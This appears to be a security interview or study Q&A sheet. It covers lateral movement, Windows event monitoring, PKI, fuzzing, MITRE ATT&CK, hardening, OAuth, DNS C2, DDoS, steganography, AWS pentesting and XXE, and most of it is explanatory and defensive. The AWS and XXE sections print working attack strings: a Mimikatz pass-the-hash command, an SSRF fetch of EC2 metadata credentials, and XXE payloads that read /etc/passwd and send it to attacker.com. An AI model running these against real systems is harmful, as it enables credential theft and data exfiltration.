Lateral movement: techniques attackers use to move from compromised system to other systems in network. Pass-the-Hash (PtH): use NTLM hash without cracking; impacket tools, CrackMapExec, Mimikatz; effective where same local admin hash reused across fleet. Pass-the-Ticket (PtT): inject Kerberos ticket (TGT or TGS) into session; Rubeus: /ptt flag; no cracking required; harvested from one machine, used on another. Overpass-the-Hash: use NTLM hash to request Kerberos TGT; Mimikatz: sekurlsa::pth /user:admin /ntlm:HASH /domain:corp.local; spawns process with Kerberos ticket from hash. Remote execution: PsExec: creates service on target, executes binary, pipes output back; detected by service creation (Event 7045) and Svcctl RPC calls. WMI (Windows Management Instrumentation): wmiexec.py or wmic.exe; creates process via Win32_Process class; less noisy than PsExec (no service creation). Scheduled tasks: schtasks /create /RU SYSTEM; runs payload as SYSTEM; Event 4698/4699. WinRM (Windows Remote Management): PowerShell Remoting; requires WinRM enabled; Enter-PSSession or Invoke-Command; authenticated; uses port 5985/5986. RDP: standard remote desktop; requires credentials or injected session (RDPHijack for unlocked sessions); highly visible. DCOM (Distributed COM): MMC20.Application.ExecuteShellCommand(); ExecuteShellCommand; requires admin; less common. SSH: if SSH enabled on Windows (Server 2019+) or Linux hosts; common for Linux-to-Linux lateral movement. Token impersonation: Incognito tool or Meterpreter token commands; steal Impersonation tokens from running processes; if high-privilege token available on compromised system: impersonate without credentials. Bloodhound: paths showing which systems current user or hash has access to; prioritise lateral movement targets.
How do you detect lateral movement in a Windows environment?

Lateral movement detection: network and host-based indicators. Network indicators: unusual internal-to-internal RDP connections; SMB connections between workstations (normal = workstation to server, not workstation to workstation); WMI connections (DCOM port 135 + ephemeral): workstation initiating WMI to other workstations unusual; unusual WinRM (5985/5986) traffic; Kerberos TGS requests for services on many hosts in short time; access to admin shares (IPC$, ADMIN$, C$) from many hosts. Windows Event Log indicators: Event 4624 (Logon success) Type 3 (Network) from unusual source; Event 4648 (Explicit credential logon) -- using another account credentials; Event 4625 (Logon failure) spray pattern; Event 7045 (Service installed) for PsExec detection; Event 4776 (NTLM auth) from unexpected host; Event 4769 (Kerberos TGS requested) for many services. Specific tool detections: PsExec: named pipe PSEXESVC; service name PSEXESVC; Event 7045 with ServiceName = PSEXESVC. WMI persistence: WMI activity log (Microsoft-Windows-WMI-Activity/Operational); WMI subscriptions (Autoruns). Pass-the-Hash: Event 4624 Type 3 with NtLmSsp authentication package from same source that also has interactive logon; source machine hash lateral movement generates Type 3 logon event at target. Behavioural analytics: UEBA (User and Entity Behaviour Analytics) in SIEM; baseline normal logon behaviour; alert on: user logging into many machines in short period; user logging in from new machine; admin account used from non-admin workstation; logons at unusual hours. Deception technology: honeypot accounts (fake admin account with no real access; any logon attempt = alert); honeyfiles on file shares (access = alert); honey credentials in LSASS (fake passwords that alert when used -- Canarytokens.org). Network segmentation: workstation-to-workstation SMB/RDP blocked by firewall rules; lateral movement forced through controlled paths; limits attacker movement.
What are Windows Event IDs important for security monitoring?

Key Windows Security Event IDs for SOC monitoring: Account management: 4720 (user account created); 4722 (user account enabled); 4723 (password change attempt by user); 4724 (password reset by admin); 4725 (account disabled); 4726 (account deleted); 4728/4732/4756 (member added to global/local/universal security group); 4729/4733/4757 (member removed from group). Authentication: 4624 (logon success) -- check logon type (2=interactive, 3=network, 4=batch, 5=service, 7=unlock, 8=NetworkCleartext, 9=NewCredentials, 10=RemoteInteractive RDP, 11=CachedInteractive); 4625 (logon failure) -- check failure reason; 4634/4647 (logoff); 4648 (logon using explicit credentials -- RunAs or over-the-network with different creds); 4768 (Kerberos TGT requested); 4769 (Kerberos TGS requested); 4776 (NTLM credential validation). Privilege use: 4672 (special privileges assigned to new logon -- admin or sensitive privilege logon); 4673 (privileged service called); 4674 (privileged operation attempted). Object access (requires audit policy): 4663 (file/registry object access -- read, write, delete); 4656 (handle to object requested); 4670 (object permissions changed). Process: 4688 (process created) -- log command line in audit policy; 4689 (process exited). Policy changes: 4719 (system audit policy changed); 4706 (new domain trust); 4704 (user right assigned). Service: 7034 (service crashed unexpectedly); 7045 (service installed). PowerShell: 4103 (module logging); 4104 (script block logging); System: 1102 (audit log cleared -- attacker anti-forensics); 104 (System log cleared). Prioritisation: 4720 (account creation), 1102 (log clearing), 4672 (admin logon), 4768/4769 (Kerberos anomalies) are high priority for SOC alerting; correlate 4624+4625 pattern for brute force detection.
How does public key infrastructure (PKI) work?

PKI (Public Key Infrastructure): framework of policies, procedures, hardware, software, and people for managing digital certificates and public keys. Asymmetric cryptography foundation: key pair: public key (share freely) and private key (keep secret); encrypt with public key, decrypt with private key; sign with private key, verify with public key. Certificate: binds public key to identity (domain name, person, organisation); contains: subject name, public key, issuer, validity period, serial number, signature of issuer. Certificate Authority (CA): trusted entity that signs certificates; vouches for identity of certificate holder; root CA: ultimate trust anchor; trusted by operating systems and browsers (preinstalled CA bundle); intermediate CA: signed by root CA; issues end-entity certificates (leaf certs); root CA kept offline; intermediate CA can be revoked if compromised. Chain of trust: browser receives TLS certificate; validates: signature of certificate made by intermediate CA (verified by intermediate CA public key); signature of intermediate CA made by root CA (verified by root CA public key); root CA in trusted store; all certificates valid (not expired, not revoked). Certificate Revocation: CRL (Certificate Revocation List): downloadable list of revoked certificate serial numbers; can be large; checked at time of validation. OCSP (Online Certificate Status Protocol): real-time check of single certificate status; OCSP Stapling: server includes signed OCSP response in TLS handshake (fresher, better performance). Certificate types: DV (Domain Validated): just verify domain control (automated via ACME protocol -- LetsEncrypt); OV (Organisation Validated): verify legal organisation; EV (Extended Validation): rigorous verification (companies showed green bar in old browsers). Use cases: TLS/HTTPS (website certificates); S/MIME (email signing and encryption); code signing; client authentication certificates (smart card logon, RADIUS certificate auth); VPN certificates. Internal PKI: organisations run their own CA (Microsoft AD CS, HashiCorp Vault, EJBCA) for internal certificates (internal websites, services, machine authentication).
What is fuzzing and how is it used in security testing?

Fuzzing: automated technique for discovering vulnerabilities by providing unexpected, random, or malformed inputs to software and monitoring for crashes, hangs, or unexpected behaviour. Types: Dumb fuzzing: completely random input; simple to implement; low efficiency for complex protocols; generates many invalid inputs rejected by application before reaching vulnerable code. Smart fuzzing: understands input format; generates valid-but-slightly-malformed inputs; more efficient; reaches deeper code paths. Mutation-based fuzzing: starts from known valid inputs (seed corpus); mutates (bit flips, value substitution, truncation, expansion); balances validity with malformation. Generation-based fuzzing: generates inputs from scratch based on defined grammar or protocol specification; ensures structural validity while fuzzing values. Coverage-guided fuzzing (most effective): instruments binary to track which code paths executed during test; AFL (American Fuzzy Lop), libFuzzer, Honggfuzz; maximises code coverage; discovers new paths; uses evolutionary algorithm to prefer inputs that explore new coverage. OSS-Fuzz: Google's continuous fuzzing infrastructure for open source projects; 900+ projects fuzzed continuously; discovered 10,000+ vulnerabilities including critical bugs in OpenSSL, FFmpeg, libpng. Application targets: C/C++ memory safety bugs: buffer overflow, use-after-free, heap corruption, integer overflow; discovered when fuzzing causes crash or ASan (Address Sanitiser) triggers; network protocol parsers (image decoders, PDF parsers, XML parsers -- complex format parsing = high bug density); web application fuzzing: Burp Suite Intruder, FFUF, wfuzz for HTTP parameter fuzzing; file format fuzzing: PDF (evince, Acrobat), image formats (ImageMagick), document formats (LibreOffice). Tools: AFL++ (most widely used binary fuzzer); libFuzzer (LLVM; for unit fuzzing with coverage); Boofuzz (Python fuzzing framework for protocols); Peach Fuzzer (commercial; model-based); Atheris (Python fuzzing). Web fuzzing: ffuf -w wordlist.txt -u http://target.com/FUZZ (directory brute force and parameter fuzzing).
What is MITRE ATT&CK framework?

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge): globally accessible knowledge base of adversary TTPs based on real-world observations; used for threat detection, red team planning, and security gap analysis. Structure: Tactics (why): adversary goals; ATT&CK for Enterprise has 14 tactics: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defence Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact. Techniques (how): specific methods to achieve tactic goal; 200+ techniques; each technique has ID (T1078 = Valid Accounts), description, procedure examples, detection methods, mitigations. Sub-techniques: specific implementations of techniques; T1078.001 = Valid Accounts: Default Accounts; T1078.002 = Valid Accounts: Domain Accounts. Procedure examples: documented use by specific threat actors; links APT groups (Fancy Bear, Lazarus) to specific techniques they use. ATT&CK Navigator: web-based tool to visualise and annotate ATT&CK matrix; highlight techniques covered by security controls; identify gaps; compare threat actor TTPs to detection coverage. Use cases: threat detection: SIEM rules mapped to ATT&CK techniques; know which techniques are detected vs blind spots; red team planning: plan exercises using techniques relevant to threats targeting your industry; purple team: test detection for specific ATT&CK techniques; vendor evaluation: map vendor security product claims to ATT&CK coverage; breach and attack simulation (BAS) tools (Atomic Red Team, Caldera) run ATT&CK technique implementations to test detection. ATT&CK variants: ATT&CK for Enterprise (Windows, Linux, macOS, cloud, network, containers); ATT&CK for Mobile (iOS, Android); ATT&CK for ICS (Industrial Control Systems); D3FEND (complementary knowledge base of defensive countermeasures). Sigma rules: community detection rules written in YAML; mapped to ATT&CK; convertible to SIEM query language (Splunk SPL, KQL, etc.).
What is a red team engagement and how does it differ from a penetration test?

Red team engagement: comprehensive adversary simulation testing an organisation's detection, response, and overall security posture; differs fundamentally from penetration test. Penetration test: find as many vulnerabilities as possible; technical focus; usually time-boxed narrow scope (external network, internal network, web app); findings = list of vulnerabilities; goal = identify gaps in defences before attackers do; typically Blue Team (defenders) is notified. Red team: simulate specific threat actor achieving specific objective; goal-oriented (steal R&D data, achieve domain admin, transfer funds); Blue Team typically not informed (true test of detection and response); narrow footprint (stealth over thoroughness); extended duration (weeks to months); measures Blue Team performance alongside technical security. Red team activities: phishing campaigns for initial access; physical access (tailgating, lock picking); command and control infrastructure setup (custom C2 profiles, rented VPS, domain fronting); post-exploitation (persistence, lateral movement, credential theft); simulated objective (exfiltrate crown jewel data without detection). Metrics: dwell time before detection; detection rate (how many Red Team activities were detected?); alerts generated vs missed; response time when detected; Blue Team containment effectiveness. TIBER-EU (Threat Intelligence Based Ethical Red Teaming): European Central Bank framework for financial sector red teaming; uses real threat intelligence about actual threats targeting organisation; common in banking. Purple team: Red and Blue team collaborate; run techniques together; Blue team watches for detection; tune controls in real-time; improve detection coverage rapidly; not adversarial -- collaborative learning. Adversary simulation tools: Cobalt Strike; Brute Ratel (newer, less detected); Covenant (open source C2); Havoc (open source); Sliver (open source). Full-scope engagement: physical + cyber + social engineering; most realistic; most expensive; appropriate for mature organisations wanting comprehensive test.
How do you approach securing a newly provisioned Linux server?

Linux server hardening checklist: Initial setup: update all packages: apt update && apt upgrade -y (or yum update); set hostname; configure timezone; set up NTP (systemd-timesyncd or chrony for accurate time -- critical for logs). User management: disable root SSH login: PermitRootLogin no in /etc/ssh/sshd_config; create service account for admin with sudo; disable or lock default accounts (ubuntu, ec2-user if not needed); enforce password policy (PAM: libpam-pwquality -- minimum length 14, complexity requirements); set password aging: chage -M 90 username. SSH hardening: key-based authentication only (PasswordAuthentication no); change default port (security through obscurity, reduces log noise: Port 2222); AllowUsers or AllowGroups to restrict who can SSH; ClientAliveInterval 300; ClientAliveCountMax 2 (auto-disconnect idle sessions); use ed25519 or ecdsa keys (stronger than RSA 2048); disable X11Forwarding unless needed. Firewall: UFW (Uncomplicated Firewall): ufw default deny incoming; ufw allow 22/tcp (or custom SSH port); ufw allow 443/tcp; ufw enable; or iptables/nftables for more granular control; firewall rules reviewed and documented. Intrusion detection: fail2ban (ban IPs with too many failed SSH/web attempts); AIDE (Advanced Intrusion Detection Environment -- file integrity monitoring: aide --init; scheduled aide --check daily); auditd (kernel audit framework: log file access, system calls; auditctl rules for sensitive files). Minimal install: remove unnecessary packages and services: systemctl disable bluetooth; disable any unused services; uninstall packages not needed (apt purge telnet ftp rsh-client); attack surface reduction. Logging: configure rsyslog or syslog-ng to send logs to centralised SIEM; ensure /var/log is on separate partition (log flooding cannot fill root filesystem); logrotate configured. SELinux/AppArmor: SELinux (RHEL/CentOS) or AppArmor (Ubuntu) mandatory access control; constrains processes to declared permissions; even if process compromised: cannot access files outside policy. Kernel hardening: sysctl settings: net.ipv4.conf.all.rp_filter=1 (IP spoofing protection); net.ipv4.tcp_syncookies=1 (SYN flood protection); kernel.randomize_va_space=2 (ASLR enabled); Lynis (open source hardening audit tool) for comprehensive assessment.
How do you handle sensitive data in application code?

Sensitive data handling best practices in application code: Never hardcode secrets: no API keys, passwords, database credentials, private keys in source code; version control (Git) often public or accessible to many developers; use environment variables or secrets management systems (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault, GCP Secret Manager). Environment variables: read at runtime from OS: os.environ.get(DATABASE_URL) (Python); process.env.DATABASE_URL (Node.js); do not log environment variables;.env files for local development: in.gitignore; never commit.env to Git. Secrets scanning: pre-commit hooks (detect-secrets, gitleaks) block commits with detected secrets; CI/CD pipeline: Truffleog, GitGuardian scan repository history for historical secret commits; GitHub secret scanning: automatically detects committed secrets (AWS keys, GitHub tokens) and alerts. Password storage: never store plaintext passwords; argon2id (recommended), bcrypt (cost factor 12+), scrypt; salted by algorithm (each hash unique per user even with same password); example: argon2.hash(password) in Python argon2-cffi library. Encryption: encrypt sensitive data at rest (AES-256-GCM): database column encryption for PII; application-level encryption before storing; key management separate from data (HSM or managed KMS). Logging: never log: passwords, tokens, session IDs, payment card numbers, SSNs, health information; log sanitisation middleware strips sensitive fields; PCI DSS PAN masking (only last 4 digits: ****1234). API responses: return minimum necessary data (never return full database row including internal fields); mask sensitive fields in API responses; strip server version headers (X-Powered-By, Server: Apache); HTTPS for all API endpoints. PII handling: data minimisation (collect only what necessary); encryption in transit (TLS 1.2+ minimum); access control (only authorised code paths access PII); audit logging of PII access; data retention policy (delete when no longer needed); GDPR right to erasure implementation.
What is OAuth 2.0 and what are common OAuth vulnerabilities?

OAuth 2.0: authorisation framework; allows third-party applications to access user resources without sharing credentials; used by every major platform for third-party app access. Flow (Authorization Code): (1) User clicks Connect with Google on app.com; (2) App redirects to accounts.google.com/oauth/auth with client_id, redirect_uri, scope, state, response_type=code; (3) User authenticates at Google and approves permissions; (4) Google redirects to redirect_uri?code=AUTH_CODE&state=STATE; (5) App backend exchanges code for tokens: POST to Google token endpoint with code + client_secret; (6) Google returns access_token and optionally refresh_token; (7) App uses access_token to call Google APIs on user behalf. Common vulnerabilities: (1) CSRF: missing or unvalidated state parameter; attacker initiates OAuth flow; sends victim the redirect URI; victim completes OAuth with attacker account; account linked to victim session; account takeover. (2) Redirect URI manipulation: if redirect_uri not strictly validated: ?redirect_uri=https://attacker.com; auth code sent to attacker; attacker exchanges for tokens; test: add extra path components, URL encoding, subdomain. (3) Token leakage via Referer: if access token included in URL (implicit flow); Referer header in subsequent navigation leaks token to third-party resources. (4) Open redirect in redirect_uri: redirect_uri=https://target.com/redirect?url=https://attacker.com; after auth, user redirected to attacker.com with auth code in URL. (5) Insecure token storage: access tokens stored in localStorage (XSS steals); should use httpOnly cookie or secure in-memory storage. (6) Scope escalation: request broader scopes than needed; app has more access than user intended. (7) Code interception (PKCE required for public clients): Proof Key for Code Exchange (PKCE) prevents code interception; required for mobile/SPA apps without server-side secret; without PKCE: auth code interceptable. OIDC (OpenID Connect): OAuth 2.0 extension; adds identity (id_token JWT with user info); additional vulnerabilities: id_token signature not verified; nonce not validated.
What is input validation and why is it crucial for security?

Input validation: ensure all data received by application is in expected format, type, length, and range before processing; first line of defence against injection attacks. Approaches: Allowlisting (preferred): define what is acceptable; reject anything not matching; username: only alphanumeric + underscore, 3-32 chars: regex ^[a-zA-Z0-9_]{3,32}$; strict but safest. Denylisting (avoid): try to list known bad inputs (remove <script>, drop SQL keywords); attackers bypass by obfuscation; incomplete by nature; last resort or supplementary. Types of validation: Type checking: is this an integer? Float? Email format? Date in YYYY-MM-DD? JSON/XML well-formed? Length checking: enforce minimum and maximum length; buffer overflows require excessive input; also prevent storage exhaustion. Range checking: age 0-150; price > 0; quantity 1-999; prevents integer overflow and business logic abuse. Format checking: credit card: 16 digits Luhn-valid; email: RFC 5321 format; IP address: valid IPv4/IPv6; phone: E.164 format. Business logic validation: order quantity must not exceed stock; date range: start before end; user can only modify own resources. Where to validate: client-side: improve UX (immediate feedback) but never sole validation (easily bypassed); server-side: mandatory; always validate at server regardless of client-side validation. Context matters: URL parameter: URL-encoded string; SQL parameter: must be parameterised (not in string); HTML output: HTML-encode; JSON output: JSON-encode; command argument: use safe subprocess API (list not string). Common mistakes: validate before sanitise (validate first, sanitise if necessary for specific contexts); validate once (do not modify input after validation -- validate the final form used); trust internal services less than external (internal microservices also need validation -- defence in depth); file names: validate extension AND content (magic bytes); numbers: validate after conversion not string comparison (parseInt(08) != 8 in some languages).
How do attackers use DNS for command and control (C2)?

DNS C2 (Command and Control over DNS): use DNS protocol to communicate between malware and attacker C2 server; effective because DNS traffic is rarely blocked and often not inspected. DNS tunneling: encode data in DNS queries/responses; attacker controls DNS server for their domain; malware makes DNS queries like DATA.c2.attacker.com; authoritative DNS server for attacker.com receives query with DATA encoded as subdomain; responds with encoded commands in DNS record (A, TXT, CNAME records used to return data); exfiltrate data in query labels: EXFIL_DATA.domain.attacker.com; command returns in DNS response. Detection challenges: DNS is essential infrastructure (cannot block entirely); legitimate software makes many DNS queries; long DNS TXT records legitimate for SPF/DKIM; DNS protocol firewalls may not exist. Capacity: DNS query label: max 63 characters; full domain: max 253 characters; TXT record: up to 255 bytes per string (multiple strings possible); typical throughput: 1-10 KB/s (slow but sufficient for commands and small exfiltration). Tools: iodine (Linux DNS tunneling tool); DNS2TCP; Cobalt Strike DNS beacon (uses A record queries for C2 traffic); NSTX; dnscat2. Detection: DNS analytics: abnormally high DNS query volume from host; DNS queries for many unique subdomains of same domain (data encoded as unique subdomain per request); very long subdomain labels; high entropy subdomains (base64 or hex encoded data); queries for non-existent domains returning NXDOMAIN in pattern; statistical analysis: legitimate domains have few unique subdomains; C2 domains have hundreds of unique subdomains. DNS sinkholing: replace malicious C2 domain DNS responses with sinkhole IP; malware cannot reach real C2; connections redirected to analyst-controlled server; passive collection of all infected hosts beaconing. Protective DNS: Cisco Umbrella, Cloudflare Gateway, Infoblox: resolve DNS queries and block known malicious domains; category-based filtering; new domain blocking (newly registered domains have high malware association).
What is a denial of service attack and how do you mitigate it?

Denial of Service (DoS) and Distributed Denial of Service (DDoS): overwhelm target resources (bandwidth, CPU, connections) to prevent legitimate access. Attack types: Volumetric: flood bandwidth; amplification attacks leverage small request that triggers large response: DNS amplification (15-50x amplification: query ANY to open resolver); NTP amplification (up to 556x: MONLIST command); memcached UDP amplification (51000x amplification via misconfigured memcached servers); reflection: attacker spoofs victim IP as source; reflectors send large response to victim. Protocol attacks: SYN flood: send many SYN packets with spoofed IPs; server creates half-open connections until SYN queue full; legitimate connections rejected; SYN cookies mitigates. Slowloris: send partial HTTP requests slowly; hold connections open; web server has limited connection pool; all connections occupied; denies legitimate access. RUDY (R-U-Dead-Yet): send POST with large Content-Length; send one byte per minute; holds connection. Application layer (Layer 7): HTTP flood: valid requests at high rate to resource-intensive page; harder to distinguish from legitimate traffic; targets search, login, cart, database-heavy endpoints. Tools: Hping3 (SYN flood testing); LOIC/HOIC (hacktivist tools); Booter/Stresser services (illegal DDoS-for-hire). Mitigation: Rate limiting: limit requests per IP per second (NGINX rate limiting, Cloudflare WAF); TCP SYN cookies: server sends SYN-ACK with special cookie; does not allocate state until ACK received; prevents SYN flood exhaustion. IP reputation: block known bad IP ranges; blocklists of botnet IPs and Tor exit nodes. BCP38: network-level ingress filtering prevents spoofed source IPs; reduces amplification attacks. CDN and DDoS scrubbing: Cloudflare, Akamai, AWS Shield absorb volumetric attacks; scrub malicious traffic before origin; anycast routing spreads attack traffic globally. Anycast: route same IP range through multiple global PoPs; attack traffic absorbed regionally rather than hitting single origin. AWS Shield Advanced, Cloudflare Magic Transit, Akamai Prolexic: enterprise DDoS protection services.
What is steganography and how is it used in security?

Steganography: hiding information within ordinary non-secret data (image, audio, video, text) without apparent alteration; different from encryption (which obscures content but reveals existence of secret); steganography hides the existence itself. Techniques: Image steganography: LSB (Least Significant Bit) substitution: replace last bit of each RGB pixel with one bit of secret data; images with 8-bit colour channels: changing last bit negligible visual difference; 24-bit RGB image with 1000x1000 pixels: 3,000,000 pixels x 1 bit per channel = 3,000,000 bits = 375 KB of hidden data. Tools: Steghide (JPEG, BMP, WAV): steghide embed -cf image.jpg -sf secret.txt; steghide extract -sf image.jpg. OpenStego. zsteg (detect LSB steganography in PNG and BMP). Exiftool (hide in EXIF metadata). Audio: LSB in WAV samples; phase coding; spread spectrum. Video: per-frame LSB in video frames; temporal redundancy between frames. Text: whitespace steganography (trailing spaces encode bits); zero-width characters (Unicode zero-width space, zero-width non-joiner); change synonyms to encode bits. Malware use: malware families (Powload, Stegano) hide payload in image pixels; downloaded image appears benign to email/proxy scanners; JavaScript reads specific pixel values, extracts encoded payload, executes; evades signature-based detection of binary payloads. C2 via steganography: commands hidden in images posted on public websites; malware downloads image; extracts hidden C2 commands; traffic appears as normal image download. Steganalysis (detection): visual attack (compare modified vs original); statistical analysis (histogram, chi-square test for LSB randomness -- embedded data changes statistics of pixel values); RS analysis; machine learning detection. Security applications: digital watermarking (embed copyright info in media); printer steganography (yellow dot patterns track printer serial number -- yellow dots steganographically encoded); covert communications (intelligence operations historically). CTF usage: steganography puzzles very common in Capture The Flag competitions; stegsolve, binwalk, strings, exiftool, steghide are go-to tools.
How do you conduct a cloud penetration test on AWS?

AWS penetration test methodology: permission requirements: AWS allows testing against own resources without prior approval for most testing; prohibited: testing from AWS infrastructure targeting non-AWS targets; absolutely requires permission: AWS staff never test without written authorisation from resource owner. Reconnaissance: identify AWS services in use (from target website headers: X-Amz-Cf-Id = CloudFront; S3 bucket URLs; API Gateway URLs); DNS enumeration reveals region (ap-southeast-1.elb.amazonaws.com); S3 bucket name discovery (company-backup.s3.amazonaws.com); AWS IP ranges published (ip-ranges.json) for comparison. IAM enumeration (with credentials): enumerate IAM permissions: aws sts get-caller-identity (who am I?); aws iam list-users; aws iam list-roles; aws iam list-policies; PowerEnum/enumerate-iam tool: test all IAM actions against current credentials to discover actual permissions; Pacu (AWS exploitation framework): automated AWS enumeration and exploitation. Common AWS misconfigurations: S3 buckets publicly readable/listable; EC2 metadata service accessible from SSRF: http://169.254.169.254/latest/meta-data/iam/security-credentials/ returns temporary credentials for EC2 role; IMDSv1 (deprecated, allows unauthenticated SSRF to metadata): SSRF vulnerability on web app fetches metadata service and returns AWS credentials; IMDSv2 requires PUT pre-flight (mitigates SSRF); Lambda environment variables exposing secrets; IAM overpermissive policies (AdministratorAccess for service roles); Security Group allowing 0.0.0.0/0 for management ports; unencrypted EBS snapshots publicly shared. SSRF to cloud metadata: find SSRF vulnerability in web app; fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME; returns AWS access key, secret key, session token; configure local AWS CLI with stolen credentials; access AWS APIs with EC2 instance permissions. Privilege escalation: if Lambda invoke permission: invoke Lambda with modified payload; if EC2 instance with admin role: use metadata credentials directly; IAM privilege escalation paths (many documented in HackTricks): if iam:CreatePolicyVersion: create new policy version with admin access; if iam:AddUserToGroup: add self to admin group. CloudTrail: all AWS API calls logged in CloudTrail; attacker actions visible to defender; enumerate slowly; use read-only actions first to blend with legitimate usage.
How do you find and exploit XXE (XML External Entity) vulnerabilities?

XXE (XML External Entity) injection: attack against application that parses XML; external entity references can read local files, perform SSRF, or cause DoS. XML entity basics: DOCTYPE declaration defines entities; external entity: <!ENTITY xxe SYSTEM file:///etc/passwd>; referenced as &xxe; in document body; if parser processes external entities: file contents injected into document. Basic XXE (file read): inject DOCTYPE with external entity: <?xml version=1.0 encoding=UTF-8?><!DOCTYPE foo [<!ENTITY xxe SYSTEM file:///etc/passwd>]><foo>&xxe;</foo>; if application echoes XML content: /etc/passwd returned. Blind XXE (no response reflection): use out-of-band data exfiltration: <!ENTITY xxe SYSTEM http://attacker.com/EXFIL?data=data:text/plain;base64,FILE_CONTENT>; or via Burp Collaborator: <!ENTITY xxe SYSTEM http://burpcollaborator.net>; Exfiltration via XML: use external DTD: <!DOCTYPE foo [<!ENTITY % dtd SYSTEM http://attacker.com/evil.dtd>%dtd;]>; evil.dtd: <!ENTITY % payload SYSTEM file:///etc/passwd><!ENTITY % trick <!ENTITY % exfil SYSTEM http://attacker.com/?x=%payload;>>%trick;%exfil;. XXE via SSRF: <!ENTITY xxe SYSTEM http://169.254.169.254/latest/meta-data/> (AWS metadata); access internal services via XXE. DoS (Billion Laughs): <!DOCTYPE foo [<!ENTITY lol lol><!ENTITY lol2 &lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;>...]> exponential entity expansion; exhausts memory; XML bomb. Finding XXE: wherever application accepts XML (SOAP web services, SVG upload, DOCX/XLSX upload, RSS feeds, REST APIs with Content-Type: text/xml); change Content-Type to text/xml and test XML body; upload SVG with embedded XXE. Fixing: disable external entity processing in XML parser: Java (DocumentBuilderFactory): factory.setFeature(http://apache.org/xml/features/disallow-doctype-decl, true); PHP: libxml_disable_entity_loader(true) (deprecated but effective); Python lxml: no network access by default; use safe parsers; whitelist allowed Content-Types.
